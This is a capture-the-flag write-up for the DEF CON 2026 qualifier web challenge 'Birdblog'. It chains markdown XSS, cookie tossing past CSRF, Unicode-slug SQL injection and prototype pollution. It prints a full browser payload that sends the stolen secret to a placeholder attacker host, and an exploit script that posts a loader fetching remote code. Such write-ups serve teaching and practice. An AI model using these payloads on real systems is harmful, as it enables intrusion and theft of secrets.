---
title: DEF CON CTF Qualifier 2026 - Birdblog
date: 2026-05-27
lastmod: 2026-05-27T16:36:00+02:00
aliases:
  - /posts/2026/05/defconquals-2026-birdblog/
categories:
  - writeup
  - defconquals26
tags:
  - web
  - sqli
  - prototype_pollution
  - xss
  - hard
authors:
  - b0n0b0
  - Valenter
---
**Original writeup author: b0n0b0**

*While ultimately flagged by yours truly, this solve was a joint effort by numerous mhackeroni webbers, including [babelo](https://theromanxpl0.it/members/babelo/), sebsrt, b0n0b0, Alemmi and others*

## Objective
The objective is to retrieve the `SECRET_KEY` from the db, in order to send it to the flag service and get the flag.

## TL;DR
1. XSS in the a comment body
2. Cookie tossing against the admin service to bypass CSRF protections
3. Tampering SQL templates abusing `anyascii` in `slugify`
4. Polluting the `minify` property making it truthy to make SQL injection live and any other property in order to throw before reaching the restart (in order to keep the `minify` property polluted)
5. Fetch the home page that will contain the `SECRET_KEY` value due to the triggered SQLi
6. Submit the `SECRET_KEY` to the flag service and retrieve the flag

## First step: XSS on the service expose on port 8080

It is possible to abuse the `markdownInline` function to create inject an XSS payload in a posted comment.

We fuzzed the function using the following fuzzer:
```js
import * as parse5 from "parse5";
import { markdown } from "../app/src/helpers/markdown.mjs";

const PAYLOAD = "onerror=alert()//";

const FORMS = [
    "{p}",
    "[{p}](http://m/)",
    "[x](http://m/{p})",
    "![{p}](http://m/)",
    "![x]({p})",
    "![alt](http://m/{p})",
    "![{p}](http://m/{p})",
    "![[{p}](http://m/)](http://m/y)",
    "![[x](http://m/) {p}](http://m/y)",
    "![![{p}](http://m/)](http://m/y)",
    "![![x](http://m/) {p}](http://m/y)",
    "[![{p}](http://m/)](http://m/y)",
    "[[{p}](http://m/)](http://m/y)",
];

function randomItem(items) {
    return items[Math.floor(Math.random() * items.length)];
}

function generate(seed) {
    let value = seed;
    const depth = 1 + Math.floor(Math.random() * 5);
    for (let i = 0; i < depth; i++) {
        value = randomItem(FORMS).replaceAll("{p}", value);
    }
    return value;
}

function eventAttributes(html) {
    const document = parse5.parseFragment(html);
    const found = [];

    function walk(node) {
        if (node.attrs) {
            for (const attr of node.attrs) {
                if (attr.name.startsWith("on")) {
                    found.push({ tag: node.tagName, name: attr.name, value: attr.value });
                }
            }
        }
        for (const child of node.childNodes ?? []) {
            walk(child);
        }
    }

    walk(document);
    return found;
}

for (let i = 0; ; i++) {
    const md = generate(PAYLOAD);
    const html = markdown(md);
    const events = eventAttributes(html);

    if (events.length > 0) {
        console.log("Generated markdown:");
        console.log(md);
        console.log("\nRendered HTML:");
        console.log(html);
        console.log("\nEvent attributes:");
        console.log(events);
        break;
    }

    if (i % 10000 === 0) {
        console.error(`tried ${i} payloads`);
    }
}
```

And found a way to execute arbitrary javascript by posting a comment. The code to generate the XSS payload is the following:

```py
def encode(s):
  r = "String.fromCharCode(" + ','.join(map(str,list(s.encode()))) + ")"
  return r

def craft_payload(js_script):
  return f"""[![](http://m/](http://m/))![+eval({encode(js_script)})//](http://m/onerror=throw/**/top.Uncaught=0,top.onerror=eval,alt//)"""
  print(craft_payload("alert('xxx')"))
```

In the final exploit we refined it, with the final result being:

```python
def craft_comment(script):
    encoded = js_string_from_char_codes(script)
    return (
        f"![javascript:eval({encoded})//[c![b![a![[x]"
        "(http://z.com/B%f9[x](http://z.com%00onerror=C%f9A%f9//))]"
        "(http://z.com/onerror=location=alt//)](http://z.com/x%f9)]"
        "(http://z.com/y%f9)](http://z.com/x%f9)](http://z.com/yA%f9)"
    )
```

## Cookie tossing

In order to force the admin performing a request to the `/configure` endpoint, we need to bypass the CSRF protection.

The issue with the CSRF token generation lies in the fact that the secret used to generate the CSRF token is stored in the cookie `_csrf` on `localhost:8081`. Since we achieved XSS on `localhost:8080` we can perform a cookie tossing attack to inject any `_csrf` cookie in the admin domain (`localhost:8081`) and by setting it's `Path` property we make sure the application uses it to verify the sent `csrfToken` value.

```js
  async function sha256Hex(s) {
    const buf = await crypto.subtle.digest(
      "SHA-256",
      new TextEncoder().encode(s)
    );
    return [...new Uint8Array(buf)]
      .map(b => b.toString(16).padStart(2, "0"))
      .join("");
  }

  const csrfSecret = "owned";
  const salt = "s";
  document.cookie = `_csrf=${csrfSecret}; Path=/configure; SameSite=Lax; Max-Age=3600`;
  document.cookie = `_csrf=${csrfSecret}; Path=/; SameSite=Lax; Max-Age=3600`;
  const csrfToken = `${salt};${await sha256Hex(`${salt}:${csrfSecret}`)}`;
```

## SQL Injection

### First step: creating a malicious SQL template
We can now force the admin to perform a POST request to `/configure`. 
We force the admin to perform the first request in order to create the malicious template:

```js
const cp = n => String.fromCodePoint(n);

function enc(abs) {
  const map = {
    "\\": cp(0x2cf9),
    "'": cp(0x02ba),
    "(": cp(0x2e28),
    ")": cp(0x226c),
    "|": cp(0x2016),
    ":": cp(0x2237),
    ".": cp(0x2025)
  };

  let out = "";
  for (let i = 0; i < abs.length; i++) {
    if (abs.startsWith("--", i)) {
      out += cp(0x2e3b) + " ";
      i++;
      continue;
    }

    const c = abs[i];
    if (/[A-Za-z0-9_]/.test(c)) {
      out += c;
    } else if (map[c]) {
      out += map[c];
    } else {
      throw new Error(`missing slug mapping for ${JSON.stringify(c)}`);
    }
  }

  return out;
}
  
const dyn =
"select to_tsvector('simple',encode(secret_key::bytea,'hex')) from secret_key";
const jsonPrefix = '[{"slug":"x","name":"';
const jsonSuffix = '","posts":[]}]';

const leakExpr = `${chrExpr(jsonPrefix)}` +
  `||((ts_stat(${chrExpr(dyn)})).word)||` +
  `${chrExpr(jsonSuffix)}`;

const bridge = enc("x\\'a--b");
const payload = enc(`))select((${leakExpr})::jsonb)))posts--b`);
```
the `payload` value will become the `categories` value in the POST request.
Due to `slugify.mjs` running `anyascii(cur)` per character, these Unicode chars will become doubled ASCII punctuation:
```
  ⸨ -> ((
  ≬ -> ()
  ‖ -> ||
  ∷ -> ::
  ʺ -> ''
```

Because the removal regex is not global, only the first malicious punctuation character is removed per original Unicode character. That lets the category slug become real SQL syntax when rendered.

After the template generation, the restart is triggered.

### Second step: pollute the `minify` property and avoid the restart

The malicious SQL template is still harmless after the restart, we need to abuse a differential between `PostgreSQL` and `pg-minify` in order to actually trigger the SQLi. 
PostgreSQL treats backslash as a normal character and escapes quotes with `''`, so `'x\''a--b'` is one string.
`pg-minify` treats `\'` as an escaped quote, thinks the string ends earlier, and sees `--b` as a comment to remove.

After minification, the rewritten SQL makes PostgreSQL close the string right before `injected ))select(...)`. 
The payload escapes the `VALUES` string context and executes, while the trailing `--b` comments out the rest of the generated query.

In order to abuse this differential, we need to pollute the `minify` property checked by `pg-promise` to a truthy value in order to trigger the `pg-minify` usage. 
We can abuse the way `navTree` properties are checked to do so:
```js
navTree[superCategory][subCategory] = [];
```  

Since we both control `superCategory` and `subCategory`, and an empty array is a truthy object, we can perform the pollution by forcing the admin to send another POST request to `/configure`. We also need the pollution to be persistent, hence we need to avoid the restart. We can pollute another value in order to make the handler throw after the minify pollution but before the restart. 

We can do that including the following values (along with the csrf and everything else) in a new POST request to `/configure` performed by the admin:
```js
categories=*__proto__/minify&inNavPosts=1&inNavPosts=2
```
Specifically, specifying to different values for `inNavPosts` makes the subsequent call to `rawArgs?.inNavPosts?.split(",")` throw, avoiding the call to `setTimeout(() => process.exit(2), 500);` 

## Get the SECRET_KEY

Once the all the steps have been performed, we can finally retrieve the `SECRET_KEY` value performing a request to the application homepage and we can then submit it to the flag service to get the flag.

## Final payloads

### payload.js

```js
(async () => {
  const EXFIL_URL = "https://REQUEST_REPO_CONTROLLED";

  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  const cp = n => String.fromCodePoint(n);

  function beacon(path, value) {
    const body = String(value);
    const url = `${EXFIL_URL}/${path}`;

    try {
      navigator.sendBeacon(url, new Blob([body], { type: "text/plain" }));
    } catch {}

    try {
      new Image().src = `${url}?d=${encodeURIComponent(body).slice(0, 1800)}`;
    } catch {}
  }

  function leakSecret(secret) {
    beacon("secret", secret);

    try {
      navigator.sendBeacon(EXFIL_URL, new Blob([secret], { type: "text/plain" }));
    } catch {}

    try {
      new Image().src = `${EXFIL_URL}/?secret=${encodeURIComponent(secret)}`;
    } catch {}
  }

  try {
    const content = document.querySelector(".comment .content");
    if (content) {
      content.textContent = "Nice birds.";
    }
  } catch {}

  if (location.hostname !== "localhost") {
    location.href =
      "http://localhost:8080" +
      location.pathname +
      location.search +
      location.hash;
    return;
  }

  async function sha256Hex(s) {
    const buf = await crypto.subtle.digest(
      "SHA-256",
      new TextEncoder().encode(s)
    );
    return [...new Uint8Array(buf)]
      .map(b => b.toString(16).padStart(2, "0"))
      .join("");
  }

  const csrfSecret = "owned";
  const salt = "s";
  document.cookie = `_csrf=${csrfSecret}; Path=/configure; SameSite=Lax; Max-Age=3600`;
  document.cookie = `_csrf=${csrfSecret}; Path=/; SameSite=Lax; Max-Age=3600`;
  const csrfToken = `${salt};${await sha256Hex(`${salt}:${csrfSecret}`)}`;

  function chrExpr(s) {
    return [...new TextEncoder().encode(s)]
      .map(b => `chr(${b})`)
      .join("||");
  }

  function enc(abs) {
    const map = {
      "\\": cp(0x2cf9),
      "'": cp(0x02ba),
      "(": cp(0x2e28),
      ")": cp(0x226c),
      "|": cp(0x2016),
      ":": cp(0x2237),
      ".": cp(0x2025)
    };

    let out = "";
    for (let i = 0; i < abs.length; i++) {
      if (abs.startsWith("--", i)) {
        out += cp(0x2e3b) + " ";
        i++;
        continue;
      }

      const c = abs[i];
      if (/[A-Za-z0-9_]/.test(c)) {
        out += c;
      } else if (map[c]) {
        out += map[c];
      } else {
        throw new Error(`missing slug mapping for ${JSON.stringify(c)}`);
      }
    }

    return out;
  }

  function configureBody(categories) {
    const body = new URLSearchParams();
    body.set("csrfToken", csrfToken);
    body.set("title", "Musings on Birds");
    body.set("theme", "raven");
    body.set("categories", categories);
    body.set("inNavPosts", "");
    return body;
  }

  async function postConfigure(body) {
    for (let i = 0; i < 45; i++) {
      try {
        await fetch("http://localhost:8081/configure", {
          method: "POST",
          mode: "no-cors",
          credentials: "include",
          body
        });
        return true;
      } catch {
        await sleep(250);
      }
    }

    return false;
  }

  beacon("status", "entered-localhost");

  const dyn =
    "select to_tsvector('simple',encode(secret_key::bytea,'hex')) from secret_key";
  const jsonPrefix = '[{"slug":"x","name":"';
  const jsonSuffix = '","posts":[]}]';

  const leakExpr =
    `${chrExpr(jsonPrefix)}` +
    `||((ts_stat(${chrExpr(dyn)})).word)||` +
    `${chrExpr(jsonSuffix)}`;

  const bridge = enc("x\\'a--b");
  const payload = enc(`))select((${leakExpr})::jsonb)))posts--b`);

  const stageA = configureBody(`*${bridge},*${payload},*safe,*__proto__/minify`);
  if (!await postConfigure(stageA)) {
    beacon("error", "stage-a-configure-failed");
    return;
  }

  await sleep(2600);

  const stageB = configureBody("*__proto__/minify");
  stageB.delete("inNavPosts");
  stageB.append("inNavPosts", "1");
  stageB.append("inNavPosts", "2");
  if (!await postConfigure(stageB)) {
    beacon("error", "stage-b-configure-failed");
    return;
  }

  await sleep(200);

  let lastHtml = "";
  for (let i = 0; i < 18; i++) {
    try {
      const r = await fetch(`http://localhost:8080/?_=${Date.now()}-${i}`, {
        credentials: "include",
        cache: "no-store"
      });

      const html = await r.text();
      lastHtml = html;
      const m = html.match(/[0-9a-f]{32,}/i);

      if (m) {
        let hex = m[0];
        if (hex.length % 2 === 1) {
          hex = hex.slice(0, -1);
        }

        const bytes = new Uint8Array(
          hex.match(/../g).map(h => parseInt(h, 16))
        );
        const secret = new TextDecoder().decode(bytes);

        leakSecret(secret);
        return;
      }
    } catch {
      // The blog process may still be restarting.
    }

    await sleep(250);
  }

  beacon("no-secret-found", lastHtml.slice(0, 2000));
})().catch(err => {
  try {
    const msg = err && (err.stack || err.message) ? err.stack || err.message : String(err);
    navigator.sendBeacon(
      "https://REQUEST_REPO_CONTROLLED/error",
      new Blob([msg], { type: "text/plain" })
    );
  } catch {}
});

```

### exploit.py

```python
#!/usr/bin/env python3
import argparse
import pathlib
import re
import sys
import urllib.error
import urllib.parse
import urllib.request


DEFAULT_PAYLOAD_URL = "https://REQUEST_REPO_CONTROLLED/payload.js"


def normalize_target(target):
    if "://" not in target:
        target = "http://" + target
    return target.rstrip("/")


def js_string_from_char_codes(script):
    return "String.fromCharCode(" + ",".join(str(ord(c)) for c in script) + ")"


def craft_comment(script):
    encoded = js_string_from_char_codes(script)
    return (
        f"![javascript:eval({encoded})//[c![b![a![[x]"
        "(http://z.com/B%f9[x](http://z.com%00onerror=C%f9A%f9//))]"
        "(http://z.com/onerror=location=alt//)](http://z.com/x%f9)]"
        "(http://z.com/y%f9)](http://z.com/x%f9)](http://z.com/yA%f9)"
    )


def loader_js(payload_url):
    payload_url = payload_url.rstrip()
    return f"""
(() => {{
  const payloadUrl = {payload_url!r};
  const s = document.createElement("script");
  s.src = payloadUrl + (payloadUrl.includes("?") ? "&" : "?") + "_=" + Date.now();
  s.referrerPolicy = "no-referrer";
  s.onerror = () => {{
    try {{
      navigator.sendBeacon(new URL("/loader-error", payloadUrl).href, location.href);
    }} catch {{}}
  }};
  (document.head || document.documentElement).appendChild(s);
}})();
""".strip()


def request_form(url, data, timeout=20):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    return urllib.request.urlopen(req, timeout=timeout)


def post_comment(target, post_id, author, content):
    url = f"{target}/post/{post_id}/comments"
    try:
        with request_form(url, {"author": author, "content": content}) as res:
            return res.status, res.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        return err.code, err.read().decode("utf-8", "replace")


def default_submit_url(target):
    parsed = urllib.parse.urlsplit(target)
    host = parsed.hostname
    if not host:
        raise ValueError(f"could not derive host from target {target!r}")
    if ":" in host and not host.startswith("["):
        host = f"[{host}]"
    return f"http://{host}:1337/submit"


def submit_secret(url, secret):
    try:
        with request_form(url, {"secretKey": secret}, timeout=20) as res:
            return res.status, res.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        return err.code, err.read().decode("utf-8", "replace")


def extract_flag(response):
    match = re.search(r"[A-Za-z0-9_]+\{[^}]+\}", response)
    return match.group(0) if match else None


def main():
    parser = argparse.ArgumentParser(
        description="Submit a Bird Blog stored-XSS loader for the hosted payload.js, or submit a leaked SECRET_KEY."
    )
    parser.add_argument("target", help="blog base URL, for example http://TARGET:8080")
    parser.add_argument("--post-id", default="1", help="post id to comment on, default: 1")
    parser.add_argument("--author", default="birdwatcher", help="comment author")
    parser.add_argument("--payload-url", default=DEFAULT_PAYLOAD_URL, help="hosted browser payload URL")
    parser.add_argument(
        "--write-comment",
        metavar="PATH",
        help="write the generated markdown XSS comment instead of submitting it",
    )
    parser.add_argument(
        "--print-comment",
        action="store_true",
        help="print the generated markdown XSS comment instead of submitting it",
    )
    parser.add_argument(
        "--secret",
        help="decoded SECRET_KEY from RequestRepo; submits it to the flag service instead of posting XSS",
    )
    parser.add_argument(
        "--submit-url",
        help="override flag submit URL; default is http://<target-host>:1337/submit",
    )
    args = parser.parse_args()

    target = normalize_target(args.target)

    if args.secret is not None:
        submit_url = args.submit_url or default_submit_url(target)
        status, response = submit_secret(submit_url, args.secret)
        print(f"[+] POST {submit_url} -> HTTP {status}")
        flag = extract_flag(response)
        print(flag or response)
        return 0 if status < 400 else 1

    comment = craft_comment(loader_js(args.payload_url))

    if args.write_comment:
        pathlib.Path(args.write_comment).write_text(comment, encoding="utf-8")
        print(f"[+] wrote markdown payload to {args.write_comment}")
        return 0

    if args.print_comment:
        print(comment)
        return 0

    status, response = post_comment(target, args.post_id, args.author, comment)
    print(f"[+] POST {target}/post/{args.post_id}/comments -> HTTP {status}")
    if status >= 400:
        print(response, file=sys.stderr)
        return 1

    print(f"[+] loader submitted; bot should fetch {args.payload_url}")
    print("[+] after RequestRepo receives the decoded secret, run:")
    print(f"    python3 exploit.py {target} --secret 'LEAKED_SECRET_KEY'")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

```
## Flag
`bbb{we_will_return_to_our_ctf_in_a_minute_but_first_a_word_from_our_sponsors_at_squawkspace:WzfZaVfL_nFC-LclmA_iuRCzcWCkWRDFl9RA_ZutGgOPiRJtLVfKYpK_VIP49ADAiZWcauJKaotkKZCu90mKSJ_8FEY}`
